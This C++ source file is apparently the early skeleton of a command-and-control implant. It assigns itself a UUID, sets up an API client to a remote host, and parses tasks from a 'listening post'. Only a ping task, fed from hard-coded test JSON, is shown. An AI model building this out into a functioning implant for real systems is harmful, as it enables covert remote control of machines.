#include "implant.hpp"


#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <vector>
#include <algorithm>

#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include "../includes/single_include/nlohmann/json.hpp"

#include <cpr/cpr.h>

using json = nlohmann::json;

Implant::Implant(std::string host, std::string port)
{   
    /* Generate unique id */
    boost::uuids::random_generator gen;
    boost::uuids::uuid ids = gen();
    std::cout << ids << '\n';
    id = boost::uuids::to_string(ids);

    /* Allocate an API */
    api = std::make_unique<Api>(host, port);
}

void Implant::beacon() {
    //api->register_device(id, "frogy");

    //api->send_result(std::make_unique<Result>(id, "Pong", 1));

    //std::cout << api->assert_ping_pong() << std::endl;
    test_get_tasks();
}

void Implant::parse_tasks_response(const std::string &response)
{
    if(response.empty()) return;
    // Local response variable
    std::stringstream ss{ response };

    // Read response from listening post as JSON
    boost::property_tree::ptree root;
    boost::property_tree::read_json(ss, root);

    for (auto &task : root)
        tasks.push_back(parse_task_from_string(task.second.get<std::string>("name")));
}

void Implant::run_all() {
    for (auto& task: tasks) {
        if (PingTask* ping_task = dynamic_cast<PingTask*>(task.get()))
            ping_task->run();
    }
}


void Implant::test_get_tasks() {
    parse_tasks_response("[{\"uid\":\"8db4dd5c-61ec-41e1-a5fc-9e78c8a1a90c\",\"name\":\"ping\"},{\"uid\":\"8db4dd5c-61ec-41e1-a5fc-9e78c8a1a90c\",\"name\":\"ping\"}]");
    
    run_all();
}